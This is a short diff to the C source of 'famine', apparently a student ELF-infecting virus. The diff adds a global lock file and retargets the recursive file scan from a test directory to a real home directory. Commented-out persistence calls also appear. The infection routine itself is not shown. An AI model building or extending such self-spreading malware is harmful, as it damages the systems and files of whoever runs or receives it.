@@ -1,4 +1,5 @@
 #include "../include/famine.h"
+#include <sys/file.h>
 
 void famine(char *fullpath) {
     FamineFile *file = elf_file_get(fullpath);
@@ -40,9 +41,27 @@ void list_recursive(const char *path) {
     closedir(dir);
 }
 
+int lock_global(void) {
+    int fd = open("/run/famine.lock", O_CREAT | O_RDWR, 0644);
+    if (fd < 0) return -1;
+
+    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
+        close(fd);
+        return -1;
+    }
+
+    return fd;
+}
+
 int main(void) {
     set_log_level(L_DEBUG);
-    DBG("This is a debug message.\n");
+    DBG("[FAMINE START]\n");
+    
+    int lock_fd = lock_global();
+    if (lock_fd < 0) {
+    DBG("ALREADY LOCKED\n");
+        return 0;
+    }
 
     pid_t pid = fork();
 
@@ -52,10 +71,12 @@ int main(void) {
         }
         // setup_boot_start();
         // exit_if_process_running();
-        list_recursive(TMPTEST_PATH);
+        list_recursive("/home/kurt/Famine");
         list_recursive(TMPTEST2_PATH);
+        close(lock_fd);
     }
 
+    close(lock_fd);
     wait(NULL);
     return (0);
 }
